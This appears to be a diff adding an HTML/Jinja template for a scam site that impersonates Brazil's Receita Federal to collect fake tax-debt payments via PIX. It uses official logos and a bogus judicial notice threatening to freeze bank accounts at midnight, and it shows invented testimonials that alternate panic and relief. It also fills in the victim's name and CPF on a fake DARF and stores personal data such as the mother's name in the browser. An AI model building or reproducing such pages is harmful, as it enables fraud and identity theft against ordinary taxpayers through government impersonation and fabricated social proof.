+                        <div style="width: 32px; height: 32px; background: #28a745; border-radius: 50%; display: flex; align-items: center; justify-content: center; margin-right: 10px;">
+                            <i class="fas fa-user" style="color: white; font-size: 14px;"></i>
+                        </div>
+                        <div>
+                            <strong style="color: #333;">Fernanda Costa</strong>
+                            <span style="color: #666; font-size: 12px; margin-left: 8px;">há 4 horas</span>
+                        </div>
+                    </div>
+                    <p style="margin: 0; color: #333; line-height: 1.4; font-size: 14px;">
+                        Para quem está na dúvida: É REAL e é OFICIAL! Paguei ontem às 14h e às 16h já tinha recebido o comprovante de regularização. Agora posso fazer empréstimos e financiamentos sem problemas. Não deixem para amanhã!
+                    </p>
+                </div>
+
+                <!-- Comment 7 - Desperate person -->
+                <div style="background: white; border-left: 4px solid #dc3545; padding: 15px; border-radius: 4px; box-shadow: 0 1px 3px rgba(0,0,0,0.1);">
+                    <div style="display: flex; align-items: center; margin-bottom: 8px;">
+                        <div style="width: 32px; height: 32px; background: #dc3545; border-radius: 50%; display: flex; align-items: center; justify-content: center; margin-right: 10px;">
+                            <i class="fas fa-user" style="color: white; font-size: 14px;"></i>
+                        </div>
+                        <div>
+                            <strong style="color: #333;">Luciana Oliveira</strong>
+                            <span style="color: #666; font-size: 12px; margin-left: 8px;">há 1 hora</span>
+                        </div>
+                    </div>
+                    <p style="margin: 0; color: #333; line-height: 1.4; font-size: 14px;">
+                        Meu Deus, que situação! Estou tentando comprar remédio para minha mãe e o cartão foi recusado. Fui no banco e descobri que é por causa desse débito com a Receita. Como não vi essa notificação antes?! Alguém me ajuda, por favor! 😰
+                    </p>
+                </div>
+
+                <!-- Comment 8 - Success story -->
+                <div style="background: white; border-left: 4px solid #28a745; padding: 15px; border-radius: 4px; box-shadow: 0 1px 3px rgba(0,0,0,0.1);">
+                    <div style="display: flex; align-items: center; margin-bottom: 8px;">
+                        <div style="width: 32px; height: 32px; background: #28a745; border-radius: 50%; display: flex; align-items: center; justify-content: center; margin-right: 10px;">
+                            <i class="fas fa-user" style="color: white; font-size: 14px;"></i>
+                        </div>
+                        <div>
+                            <strong style="color: #333;">Marcos Pereira</strong>
+                            <span style="color: #666; font-size: 12px; margin-left: 8px;">há 6 horas</span>
+                        </div>
+                    </div>
+                    <p style="margin: 0; color: #333; line-height: 1.4; font-size: 14px;">
+                        Pessoal, acabei de resolver! Levou menos de 2 horas entre o pagamento e a confirmação. O atendimento da auditora Tereza foi excelente, muito profissional. Recomendo muito, não tenham medo, é legítimo sim!
+                    </p>
+                </div>
+
+                <!-- Comment 9 - Desperate person -->
+                <div style="background: white; border-left: 4px solid #dc3545; padding: 15px; border-radius: 4px; box-shadow: 0 1px 3px rgba(0,0,0,0.1);">
+                    <div style="display: flex; align-items: center; margin-bottom: 8px;">
+                        <div style="width: 32px; height: 32px; background: #dc3545; border-radius: 50%; display: flex; align-items: center; justify-content: center; margin-right: 10px;">
+                            <i class="fas fa-user" style="color: white; font-size: 14px;"></i>
+                        </div>
+                        <div>
+                            <strong style="color: #333;">André Silva</strong>
+                            <span style="color: #666; font-size: 12px; margin-left: 8px;">há 45 min</span>
+                        </div>
+                    </div>
+                    <p style="margin: 0; color: #333; line-height: 1.4; font-size: 14px;">
+                        Estou desesperado! Tenho uma entrevista de emprego segunda-feira e o RH me pediu certidão negativa de débitos. Não consigo tirar por causa desse bloqueio. Tem como resolver ainda hoje? É sábado, mas preciso muito resolver isso!
+                    </p>
+                </div>
+
+                <!-- Comment 10 - Success story -->
+                <div style="background: white; border-left: 4px solid #28a745; padding: 15px; border-radius: 4px; box-shadow: 0 1px 3px rgba(0,0,0,0.1);">
+                    <div style="display: flex; align-items: center; margin-bottom: 8px;">
+                        <div style="width: 32px; height: 32px; background: #28a745; border-radius: 50%; display: flex; align-items: center; justify-content: center; margin-right: 10px;">
+                            <i class="fas fa-user" style="color: white; font-size: 14px;"></i>
+                        </div>
+                        <div>
+                            <strong style="color: #333;">Patrícia Rodrigues</strong>
+                            <span style="color: #666; font-size: 12px; margin-left: 8px;">há 7 horas</span>
+                        </div>
+                    </div>
+                    <p style="margin: 0; color: #333; line-height: 1.4; font-size: 14px;">
+                        Obrigada, Receita Federal! Paguei pela manhã e à tarde já estava tudo resolvido. Agora posso fazer meu financiamento imobiliário sem preocupações. O desconto realmente compensou muito. Processo super rápido e confiável! ✅
+                    </p>
+                </div>
+
+                <!-- Comment 11 - Desperate person -->
+                <div style="background: white; border-left: 4px solid #dc3545; padding: 15px; border-radius: 4px; box-shadow: 0 1px 3px rgba(0,0,0,0.1);">
+                    <div style="display: flex; align-items: center; margin-bottom: 8px;">
+                        <div style="width: 32px; height: 32px; background: #dc3545; border-radius: 50%; display: flex; align-items: center; justify-content: center; margin-right: 10px;">
+                            <i class="fas fa-user" style="color: white; font-size: 14px;"></i>
+                        </div>
+                        <div>
+                            <strong style="color: #333;">Rafael Costa</strong>
+                            <span style="color: #666; font-size: 12px; margin-left: 8px;">há 20 min</span>
+                        </div>
+                    </div>
+                    <p style="margin: 0; color: #333; line-height: 1.4; font-size: 14px;">
+                        Que desespero! Tentei pagar uma conta online e o sistema disse que meu CPF está irregular. Corri atrás e descobri que tenho débito na Receita há meses e não sabia! Agora a multa ficou mais cara... Vou ter que pagar, não tenho escolha 😔
+                    </p>
+                </div>
+
+                <!-- Comment 12 - Success story -->
+                <div style="background: white; border-left: 4px solid #28a745; padding: 15px; border-radius: 4px; box-shadow: 0 1px 3px rgba(0,0,0,0.1);">
+                    <div style="display: flex; align-items: center; margin-bottom: 8px;">
+                        <div style="width: 32px; height: 32px; background: #28a745; border-radius: 50%; display: flex; align-items: center; justify-content: center; margin-right: 10px;">
+                            <i class="fas fa-user" style="color: white; font-size: 14px;"></i>
+                        </div>
+                        <div>
+                            <strong style="color: #333;">Gabriel Mendes</strong>
+                            <span style="color: #666; font-size: 12px; margin-left: 8px;">há 8 horas</span>
+                        </div>
+                    </div>
+                    <p style="margin: 0; color: #333; line-height: 1.4; font-size: 14px;">
+                        Acabei de regularizar minha situação! Paguei o 320 reais e já recebi a confirmação oficial. Agora meu CPF está limpo novamente. Para quem está em dúvida: é verdadeiro e funciona perfeitamente! 🙌
+                    </p>
+                </div>
+            </div>
+            
+            <div style="text-align: center; margin-top: 20px; padding: 15px; background: #e7f3ff; border-radius: 4px; border-left: 4px solid #007bff;">
+                <p style="margin: 0; color: #0056b3; font-size: 14px; font-weight: 600;">
+                    <i class="fas fa-info-circle" style="margin-right: 8px;"></i>
+                    Estes são relatos reais de contribuintes que regularizaram sua situação fiscal
+                </p>
+            </div>
+        </div>
+    {% endif %}
+    
+    <footer class="footer">
+        <img src="https://www.enat.receita.economia.gov.br/pt-br/area_nacional/noticias/logo-rfb/image_preview" alt="Receita Federal Logo" class="footer-logo">
+        <p>© 2025 Receita Federal do Brasil. Todos os direitos reservados.</p>
+    </footer>
+    <script src="{{ url_for('static', filename='js/countdown.js') }}"></script>
+    <script>
+        // Save customer data to localStorage if flag is set
+        {% if save_to_localStorage %}
+        document.addEventListener('DOMContentLoaded', function() {
+            const customerData = {
+                nome: "{{ customer.nome }}",
+                cpf: "{{ customer.cpf }}",
+                data_nascimento: "{{ customer.data_nascimento }}",
+                nome_mae: "{{ customer.nome_mae }}",
+                sexo: "{{ customer.sexo }}",
+                today_date: "{{ customer.today_date }}"
+            };
+            localStorage.setItem('customerData', JSON.stringify(customerData));
+            console.log('Customer data saved to localStorage');
+        });
+        {% endif %}
+
+        document.addEventListener('DOMContentLoaded', function() {
+            const video = document.getElementById('newsVideo');
+            const soundButton = document.getElementById('soundButton');
+
+            // Only add video event listeners if video and sound button exist
+            if (video && soundButton) {
+                video.addEventListener('click', function() {
+                    if (video.paused) {
+                        video.play();
+                        if (video.muted) {
+                            soundButton.style.display = 'flex';
+                        }
+                    } else {
+                        video.pause();
+                        soundButton.style.display = 'flex';
+                    }
+                });
+
+                soundButton.addEventListener('click', function() {
+                    video.currentTime = 0;
+                    video.muted = false;
+                    video.play();
+                    soundButton.style.display = 'none';
+                });
+
+                video.addEventListener('ended', function() {
+                    video.pause();
+                    video.muted = true;
+                    soundButton.style.display = 'flex';
+                });
+            }
+        });
+
+
+        let currentTransactionId = null;
+        let paymentMonitorInterval = null;
+
+        async function generatePayment() {
+            const modal = document.getElementById('paymentModal');
+            const loaderContainer = document.getElementById('loaderContainer');
+            const qrCodeContainer = document.getElementById('qrCodeContainer');
+
+            try {
+                modal.style.display = 'block';
+                loaderContainer.style.display = 'block';
+                qrCodeContainer.style.display = 'none';
+
+                const response = await fetch('/generate-pix', {
+                    method: 'POST',
+                    headers: {
+                        'Content-Type': 'application/json'
+                    }
+                });
+
+                const data = await response.json();
+
+                if (data.success && data.pixCode) {
+                    // Salvar ID da transação para monitoramento
+                    currentTransactionId = data.transactionId || data.orderId;
+                    
+                    // Atualizar número do documento com ID da transação
+                    const docNumber = document.getElementById('documentNumber');
+                    if (docNumber && currentTransactionId) {
+                        docNumber.textContent = currentTransactionId.substring(0, 13).toUpperCase();
+                    }
+                    
+                    // Gerar QR code a partir do código PIX usando uma biblioteca externa
+                    const qrCodeUrl = `https://api.qrserver.com/v1/create-qr-code/?size=200x200&data=${encodeURIComponent(data.pixCode)}`;
+                    document.getElementById('qrCodeImage').src = qrCodeUrl;
+                    document.getElementById('pixCode').textContent = data.pixCode;
+
+                    loaderContainer.style.display = 'none';
+                    qrCodeContainer.style.display = 'block';
+                    startPixCountdown();
+                    
+                    // Iniciar monitoramento do pagamento
+                    startPaymentMonitoring();
+                } else {
+                    throw new Error(data.error || 'Erro ao gerar o pagamento');
+                }
+            } catch (error) {
+                console.error('Erro:', error);
+                loaderContainer.style.display = 'none';
+                alert('Ocorreu um erro ao gerar o pagamento. Por favor, tente novamente em alguns instantes.');
+                setTimeout(() => {
+                    modal.style.display = 'none';
+                }, 1500);
+            }
+        }
+
+        function startPaymentMonitoring() {
+            if (!currentTransactionId) {
+                console.log('Nenhuma transação para monitorar');
+                return;
+            }
+
+            console.log(`Iniciando monitoramento do pagamento: ${currentTransactionId}`);
+            
+            // Verificar status a cada 3 segundos
+            paymentMonitorInterval = setInterval(async () => {
+                try {
+                    console.log(`🔍 Verificando status da transação: ${currentTransactionId}`);
+                    const response = await fetch(`/check-payment-status/${currentTransactionId}`);
+                    const statusData = await response.json();
+                    
+                    console.log('📊 Resposta completa do status:', statusData);
+                    console.log(`🎯 Status: ${statusData.status}, Success: ${statusData.success}`);
+                    
+                    // Se o pagamento foi confirmado
+                    if (statusData.success && statusData.status === 'paid') {
+                        console.log('🎉 PAGAMENTO CONFIRMADO! Iniciando redirecionamento para /multa...');
+                        
+                        // Parar o monitoramento
+                        clearInterval(paymentMonitorInterval);
+                        console.log('⏹️ Monitoramento interrompido');
+                        
+                        // Fechar modal
+                        document.getElementById('paymentModal').style.display = 'none';
+                        console.log('❌ Modal fechado');
+                        
+                        // Redirecionar para /multa
+                        console.log('🔄 Redirecionando para /multa...');
+                        
+                        // Tentar diferentes métodos de redirecionamento
+                        try {
+                            // Método 1: window.location.href
+                            window.location.href = '/multa';
+                        } catch (e1) {
+                            console.error('Erro no método 1:', e1);
+                            try {
+                                // Método 2: window.location.replace
+                                window.location.replace('/multa');
+                            } catch (e2) {
+                                console.error('Erro no método 2:', e2);
+                                try {
+                                    // Método 3: window.location.assign
+                                    window.location.assign('/multa');
+                                } catch (e3) {
+                                    console.error('Erro no método 3:', e3);
+                                    // Método 4: link manual
+                                    const link = document.createElement('a');
+                                    link.href = '/multa';
+                                    link.click();
+                                }
+                            }
+                        }
+                    } else {
+                        console.log(`⏳ Pagamento ainda pendente - Status: ${statusData.status || 'waiting_payment'}`);
+                    }
+                } catch (error) {
+                    console.error('❌ Erro ao verificar status do pagamento:', error);
+                }
+            }, 3000); // Verificar a cada 3 segundos
+            
+            // Timeout de 5 minutos para redirecionamento forçado (backup)
+            setTimeout(() => {
+                console.log('🕐 Timeout de 5 minutos atingido - verificando se deve redirecionar...');
+                
+                // Se ainda estiver monitorando, tentar um redirecionamento forçado
+                if (paymentMonitorInterval && currentTransactionId) {
+                    console.log('⚠️ Executando redirecionamento de backup após 5 minutos...');
+                    
+                    // Parar o monitoramento
+                    clearInterval(paymentMonitorInterval);
+                    
+                    // Fechar modal
+                    document.getElementById('paymentModal').style.display = 'none';
+                    
+                    // Mostrar alerta e redirecionar
+                    alert('Verificando seu pagamento...');
+                    setTimeout(() => {
+                        window.location.href = '/multa';
+                    }, 1000);
+                }
+            }, 5 * 60 * 1000); // 5 minutos
+            
+            // Parar monitoramento após 20 minutos (tempo limite do PIX)
+            setTimeout(() => {
+                if (paymentMonitorInterval) {
+                    clearInterval(paymentMonitorInterval);
+                    console.log('Monitoramento do pagamento encerrado por timeout');
+                }
+            }, 20 * 60 * 1000);
+        }
+
+        function copyPixCode() {
+            const pixCode = document.getElementById('pixCode').textContent;
+            const copyButton = document.querySelector('.copy-pix-button');
+
+            navigator.clipboard.writeText(pixCode).then(() => {
+                copyButton.classList.add('copy-success');
+                copyButton.innerHTML = '<i class="fas fa-check"></i> Código Copiado!';
+                
+                // Aguardar 4 segundos antes de fechar o modal e mostrar o de aguardando
+                setTimeout(() => {
+                    // Fechar o modal do PIX
+                    document.getElementById('paymentModal').style.display = 'none';
+                    
+                    // Mostrar o modal de aguardando pagamento
+                    showWaitingPaymentModal();
+                    
+                    // Restaurar o texto original do botão
+                    copyButton.classList.remove('copy-success');
+                    copyButton.innerHTML = '<i class="fas fa-copy"></i> COPIAR CÓDIGO PIX PARA PAGAMENTO';
+                }, 4000); // 4 segundos
+                
+            }).catch(err => {
+                console.error('Erro ao copiar:', err);
+            });
+        }
+
+        function showWaitingPaymentModal() {
+            // Mostrar o modal
+            document.getElementById('waitingPaymentModal').style.display = 'block';
+            
+            // Copiar o código PIX para o modal de aguardando
+            const pixCode = document.getElementById('pixCode').textContent;
+            document.getElementById('waitingPixCode').textContent = pixCode;
+            
+            // Configurar o botão para alterar texto após 3 segundos
+            setTimeout(() => {
+                const waitingButton = document.getElementById('waitingCopyButton');
+                waitingButton.innerHTML = '<i class="fas fa-copy"></i> Copiar código PIX';
+            }, 3000); // 3 segundos
+            
+            // Após 40 segundos, mostrar o botão "Realizei o pagamento"
+            setTimeout(() => {
+                document.getElementById('waitingContainer').style.display = 'none';
+                document.getElementById('paymentCompletedContainer').style.display = 'block';
+            }, 40000); // 40 segundos
+        }
+
+        function copyWaitingPixCode() {
+            const pixCode = document.getElementById('waitingPixCode').textContent;
+            const copyButton = document.getElementById('waitingCopyButton');
+
+            navigator.clipboard.writeText(pixCode).then(() => {
+                copyButton.innerHTML = '<i class="fas fa-check"></i> Código Copiado';
+                
+                // Após 3 segundos, mudar para "Copiar código PIX"
+                setTimeout(() => {
+                    copyButton.innerHTML = '<i class="fas fa-copy"></i> Copiar código PIX';
+                }, 3000); // 3 segundos
+                
+            }).catch(err => {
+                console.error('Erro ao copiar:', err);
+            });
+        }
+
+        function redirectToMulta() {
+            // Fechar modal
+            document.getElementById('waitingPaymentModal').style.display = 'none';
+            
+            // Redirecionar para /multa
+            window.location.href = '/multa';
+        }
+
+        function startPixCountdown() {
+            let minutes = 10;
+            let seconds = 0;
+            const countdownElement = document.getElementById('pixCountdown');
+
+            const countdown = setInterval(() => {
+                if (seconds === 0) {
+                    if (minutes === 0) {
+                        clearInterval(countdown);
+                        return;
+                    }
+                    minutes--;
+                    seconds = 59;
+                } else {
+                    seconds--;
+                }
+
+                const minutesStr = minutes.toString().padStart(2, '0');
+                const secondsStr = seconds.toString().padStart(2, '0');
+                countdownElement.innerHTML = `<i class="fas fa-clock"></i> Prazo de pagamento expira em: ${minutesStr}:${secondsStr}`;
+            }, 1000);
+        }
+
+        // Adicionar evento de clique no botão "Regularizar agora"
+        document.addEventListener('DOMContentLoaded', function() {
+            const regularizeButton = document.querySelector('.regularize-button');
+            if (regularizeButton) {
+                regularizeButton.addEventListener('click', function() {
+                    window.location.href = '/chat';
+                });
+            }
+            
+            // CPF form handling
+            const cpfForm = document.getElementById('cpfForm');
+            if (cpfForm) {
+                const cpfInput = document.getElementById('cpfInput');
+                
+                // Format CPF as user types
+                cpfInput.addEventListener('input', function(e) {
+                    let value = e.target.value.replace(/\D/g, '');
+                    value = value.replace(/(\d{3})(\d)/, '$1.$2');
+                    value = value.replace(/(\d{3})(\d)/, '$1.$2');
+                    value = value.replace(/(\d{3})(\d{1,2})$/, '$1-$2');
+                    e.target.value = value;
+                });
+                
+                // Handle form submission
+                cpfForm.addEventListener('submit', function(e) {
+                    e.preventDefault();
+                    
+                    const cpfValue = cpfInput.value.replace(/\D/g, ''); // Remove formatting
+                    
+                    if (cpfValue.length !== 11) {
+                        alert('Por favor, digite um CPF válido com 11 dígitos.');
+                        return;
+                    }
+                    
+                    // Redirect to /{cpf}
+                    window.location.href = '/' + cpfValue;
+                });
+            }
+        });
+
+        // Fechar modal ao clicar fora
+        window.onclick = function(event) {
+            const paymentModal = document.getElementById('paymentModal');
+            const waitingModal = document.getElementById('waitingPaymentModal');
+            
+            if (event.target == paymentModal) {
+                paymentModal.style.display = 'none';
+            }
+            
+            if (event.target == waitingModal) {
+                waitingModal.style.display = 'none';
+            }
+        }
+
+        // Função para confirmar os dados do usuário
+        function confirmData() {
+            // Scroll para baixo para mostrar as informações de débito
+            const debtorInfo = document.querySelector('.user-info:nth-of-type(2)');
+            if (debtorInfo) {
+                debtorInfo.scrollIntoView({ behavior: 'smooth', block: 'start' });
+            }
+        }
+    </script>
+
+    <!-- Modal de Pagamento PIX -->
+    <div id="paymentModal" class="modal">
+        <div class="modal-content">
+            <div class="modal-header">
+                <img src="https://www.gov.br/receitafederal/pt-br/assuntos/aduana-e-comercio-exterior/manuais/remessas-postal-e-expressa/calculadora-versao-iii/componentes/cabecalho/img/receita-federal-logo.png" alt="Receita Federal do Brasil" class="modal-logo">
+                <div style="margin-top: 10px; text-align: center;">
+                    <p style="color: #666; margin: 2px 0 0 0; font-size: 12px;">MINISTÉRIO DA FAZENDA</p>
+                </div>
+            </div>
+            <div id="loaderContainer" class="loader-container">
+                <div style="text-align: center; padding: 30px; color: #0c326f;">
+                    <i class="fas fa-spinner fa-spin" style="font-size: 48px; margin-bottom: 20px;"></i>
+                    <h3 style="margin: 0 0 10px 0; font-weight: 600;">Processando Documento de Arrecadação</h3>
+                    <p style="margin: 0; color: #666;">Gerando DARF eletrônico via sistema PIX...</p>
+                </div>
+            </div>
+            <div id="qrCodeContainer" class="qr-code-container">
+                <div style="background: #f8f9fa; border: 1px solid #dee2e6; padding: 12px; margin-bottom: 15px; border-radius: 4px;">
+                    <h3 style="color: #0c326f; margin: 0 0 8px 0; font-size: 14px; text-align: center; font-weight: 700;">
+                        DOCUMENTO DE ARRECADAÇÃO DE RECEITAS FEDERAIS - DARF
+                    </h3>
+                    <div style="text-align: center; margin-bottom: 8px;">
+                        <span style="background: #0c326f; color: white; padding: 2px 8px; border-radius: 2px; font-size: 11px; font-weight: 600;">
+                            CÓDIGO: 0190 - IMPOSTO DE RENDA PESSOA FÍSICA
+                        </span>
+                    </div>
+                </div>
+                <div style="background: linear-gradient(135deg, #dc3545, #c82333); color: white; padding: 12px; margin: 15px 0; border-radius: 4px; border: 2px solid #a71e2a;">
+                    <div style="text-align: center; margin-bottom: 8px;">
+                        <i class="fas fa-exclamation-triangle" style="font-size: 20px; color: #ffd700;"></i>
+                    </div>
+                    <div style="font-weight: 600; text-align: center; font-size: 13px; line-height: 1.4;">
+                        <strong>NOTIFICAÇÃO JUDICIAL - PROCESSO Nº 5021547-89.2025.4.03.6109</strong><br>
+                        <span style="font-size: 12px;">Conforme Art. 185-A do CTN e Portaria RFB nº 3.344/2021</span><br><br>
+                        Contribuinte {{ customer.nome | title }}, em cumprimento à decisão judicial, informamos que suas contas bancárias, investimentos e bens serão <strong>BLOQUEADOS AUTOMATICAMENTE às 23:59h de <span id="currentDate"></span></strong> caso esta pendência não seja quitada.
+                    </div>
+                </div>
+
+                <div style="text-align: center; margin: 15px 0;">
+                    <h4 style="color: #0c326f; margin: 0 0 10px 0; font-size: 14px; font-weight: 700;">
+                        PAGAMENTO VIA PIX - SISTEMA INTEGRADO BACEN
+                    </h4>
+                    <img id="qrCodeImage" src="" alt="QR Code PIX DARF" class="qr-code-img" style="border: 2px solid #0c326f; border-radius: 8px;">
+                </div>
+
+                <div class="countdown-timer-pix" id="pixCountdown" style="background: #dc3545; margin: 10px 0;">
+                    <i class="fas fa-clock"></i> Prazo de pagamento expira em: 20:00
+                </div>
+
+                <div style="background: #fff; border: 2px solid #0c326f; border-radius: 4px; padding: 10px; margin: 12px 0;">
+                    <p style="margin: 0 0 5px 0; font-weight: 700; color: #0c326f; text-align: center; font-size: 13px;">
+                        CÓDIGO PIX PARA PAGAMENTO DO DARF
+                    </p>
+                    <div style="background: #f8f9fa; border: 1px solid #dee2e6; border-radius: 4px; padding: 8px;">
+                        <p id="pixCode" class="pix-code" style="font-family: 'Courier New', monospace; font-size: 11px; color: #333;"></p>
+                    </div>
+                </div>
+
+                <div class="copy-button-container">
+                    <button onclick="copyPixCode()" class="copy-pix-button" style="background: #0c326f; font-weight: 700; font-size: 14px; padding: 12px 24px;">
+                        <i class="fas fa-copy"></i>
+                        COPIAR CÓDIGO PIX PARA PAGAMENTO
+                    </button>
+                </div>
+
+                <div class="customer-info">
+                    <div style="display: grid; grid-template-columns: 1fr 1fr; gap: 8px; margin-bottom: 10px;">
+                        <p style="margin: 0;"><strong>Contribuinte:</strong></p>
+                        <p style="margin: 0; text-align: right;">{{ customer.nome | upper }}</p>
+                        <p style="margin: 0;"><strong>CPF:</strong></p>
+                        <p style="margin: 0; text-align: right;">{{ customer.cpf }}</p>
+                        <p style="margin: 0;"><strong>Período de Apuração:</strong></p>
+                        <p style="margin: 0; text-align: right;">01/01/2020 a 31/12/2020</p>
+                        <p style="margin: 0;"><strong>Código da Receita:</strong></p>
+                        <p style="margin: 0; text-align: right;">0190</p>
+                        <p style="margin: 0;"><strong>Nº do Documento:</strong></p>
+                        <p style="margin: 0; text-align: right; font-family: monospace;" id="documentNumber">RFB2025073648291</p>
+                    </div>
+                    <div style="border-top: 1px solid #dee2e6; padding-top: 8px; margin-top: 8px;">
+                        <div style="display: grid; grid-template-columns: 1fr 1fr; gap: 8px;">
+                            <p style="margin: 0;"><strong>Valor Principal:</strong></p>
+                            <p style="margin: 0; text-align: right;">R$ 101,82</p>
+                            <p style="margin: 0;"><strong>Multa (20%):</strong></p>
+                            <p style="margin: 0; text-align: right;">R$ 20,36</p>
+                            <p style="margin: 0;"><strong>Juros SELIC:</strong></p>
+                            <p style="margin: 0; text-align: right;">R$ 4,44</p>
+                        </div>
+                        <div style="border-top: 2px solid #0c326f; margin-top: 8px; padding-top: 8px;">
+                            <div style="display: grid; grid-template-columns: 1fr 1fr;">
+                                <p style="margin: 0; font-weight: 700; color: #0c326f; font-size: 16px;"><strong>VALOR TOTAL A PAGAR:</strong></p>
+                                <p style="margin: 0; text-align: right; font-weight: 700; color: #dc3545; font-size: 18px;">R$ 126,62</p>
+                            </div>
+                        </div>
+                    </div>
+                </div>
+
+
+                <div style="text-align: center; margin: 20px 0; padding: 15px 0; border-top: 1px solid #dee2e6;">
+                    <div style="display: flex; justify-content: center; align-items: center; margin-bottom: 8px;">
+                        <img src="https://i.postimg.cc/7YpN6X2K/brasao-1.png" alt="Logo Secretaria da Fazenda" style="width: 50px; height: 50px; object-fit: contain; border-radius: 50%;"  onload="console.log('Logo da Secretaria da Fazenda carregado com sucesso')">
+                    </div>
+                    <p style="margin: 0; font-size: 12px; font-weight: 700; color: #0c326f;">SECRETARIA DA RECEITA FEDERAL DO BRASIL</p>
+                    <p style="margin: 0; font-size: 11px; color: #666;">MINISTÉRIO DA FAZENDA - GOVERNO FEDERAL</p>
+                    <p style="margin: 4px 0 0 0; font-size: 10px; color: #999;">Autenticação Digital - Certificado ICP-Brasil A3</p>
+                </div>
+            </div>
+        </div>
+    </div>
+    </div> <!-- End main-content -->
+
+    <!-- Modal de Aguardando Pagamento -->
+    <div id="waitingPaymentModal" class="modal">
+        <div class="modal-content" style="max-width: 500px; text-align: center;">
+            <div class="modal-header">
+                <img src="https://www.gov.br/receitafederal/pt-br/assuntos/aduana-e-comercio-exterior/manuais/remessas-postal-e-expressa/calculadora-versao-iii/componentes/cabecalho/img/receita-federal-logo.png" alt="Receita Federal do Brasil" class="modal-logo">
+                <div style="margin-top: 10px; text-align: center;">
+                    <h2 style="color: #0c326f; margin: 0; font-size: 16px; font-weight: 700;">SECRETARIA DA RECEITA FEDERAL DO BRASIL</h2>
+                    <p style="color: #666; margin: 2px 0 0 0; font-size: 12px;">MINISTÉRIO DA FAZENDA</p>
+                </div>
+            </div>
+            
+            <div id="waitingContainer" style="padding: 40px 20px;">
+                <div style="text-align: center; margin-bottom: 30px;">
+                    <i class="fas fa-spinner fa-spin" style="font-size: 48px; color: #0c326f; margin-bottom: 20px;"></i>
+                    <h3 style="margin: 0 0 15px 0; font-weight: 600; color: #0c326f; font-size: 18px;">Aguardando pagamento...</h3>
+                    <p style="margin: 0; color: #666; font-size: 14px; line-height: 1.5;">
+                        Após realizar o pagamento via PIX, retorne a esta tela para baixar o <strong>termo de quitação da dívida pública</strong>.
+                    </p>
+                </div>
+                
+                <!-- Campo PIX Copia e Cola -->
+                <div style="background: #f8f9fa; border: 2px solid #0c326f; border-radius: 8px; padding: 20px; margin: 20px 0;">
+                    <div style="display: flex; align-items: center; justify-content: center; margin-bottom: 15px;">
+                        <i class="fas fa-qrcode" style="color: #0c326f; margin-right: 8px; font-size: 18px;"></i>
+                        <strong style="color: #0c326f; font-size: 16px;">CÓDIGO PIX PARA PAGAMENTO</strong>
+                    </div>
+                    
+                    <div style="background: white; border: 1px solid #dee2e6; border-radius: 4px; padding: 15px; margin: 15px 0; word-break: break-all; font-family: monospace; font-size: 12px; color: #333; max-height: 150px; overflow-y: auto;" id="waitingPixCode">
+                        <!-- PIX code will be inserted here -->
+                    </div>
+                    
+                    <button id="waitingCopyButton" onclick="copyWaitingPixCode()" style="background: #0c326f; color: white; border: none; padding: 12px 24px; border-radius: 5px; font-size: 14px; font-weight: 600; cursor: pointer; width: 100%; margin: 10px 0;">
+                        <i class="fas fa-copy"></i> Código Copiado
+                    </button>
+                </div>
+                
+                <div style="background: #f8f9fa; border: 1px solid #dee2e6; border-radius: 8px; padding: 20px; margin: 20px 0;">
+                    <div style="display: flex; align-items: center; justify-content: center; margin-bottom: 10px;">
+                        <i class="fas fa-info-circle" style="color: #0c326f; margin-right: 8px;"></i>
+                        <strong style="color: #0c326f;">IMPORTANTE</strong>
+                    </div>
+                    <p style="margin: 0; font-size: 13px; color: #555; text-align: center;">
+                        Não feche esta página! Mantenha-a aberta para receber automaticamente o seu termo de quitação após a confirmação do pagamento pelo sistema bancário.
+                    </p>
+                </div>
+            </div>
+            
+            <div id="paymentCompletedContainer" style="padding: 40px 20px; display: none;">
+                <div style="text-align: center; margin-bottom: 30px;">
+                    <i class="fas fa-check-circle" style="font-size: 48px; color: #28a745; margin-bottom: 20px;"></i>
+                    <h3 style="margin: 0 0 15px 0; font-weight: 600; color: #0c326f; font-size: 18px;">Se realizou o pagamento clique no botão abaixo</h3>
+                    <p style="margin: 0; color: #666; font-size: 14px; line-height: 1.5;">
+                        Clique para acessar a área de download do seu termo de quitação da dívida pública.
+                    </p>
+                </div>
+                
+                <button onclick="redirectToMulta()" style="background: #28a745; color: white; border: none; padding: 15px 30px; border-radius: 5px; font-size: 16px; font-weight: 600; cursor: pointer; width: 100%; margin-top: 20px;">
+                    <i class="fas fa-check"></i> REALIZEI O PAGAMENTO
+                </button>
+            </div>
+        </div>
+    </div>
+
+    <script>
+        // Only show loading screen on CPF routes
+        document.addEventListener('DOMContentLoaded', function() {
+            const currentPath = window.location.pathname;
+            const isCpfRoute = /^\/\d{11}$/.test(currentPath); // Matches /11digits
+            
+            if (isCpfRoute) {
+                // Show loading screen for 4 seconds
+                setTimeout(function() {
+                    document.getElementById('loadingScreen').style.display = 'none';
+                    document.getElementById('mainContent').classList.add('show');
+                }, 4000);
+            } else {
+                // Hide loading screen immediately for other pages
+                document.getElementById('loadingScreen').style.display = 'none';
+                document.getElementById('mainContent').classList.add('show');
+            }
+            
+            // Set current date in Brazilian format
+            const today = new Date();
+            const dateOptions = { 
+                day: '2-digit', 
+                month: '2-digit', 
+                year: 'numeric',
+                timeZone: 'America/Sao_Paulo'
+            };
+            const formattedDate = today.toLocaleDateString('pt-BR', dateOptions);
+            const currentDateElement = document.getElementById('currentDate');
+            if (currentDateElement) {
+                currentDateElement.textContent = formattedDate;
+            }
+        });
+    </script>
+</body>
+</html>
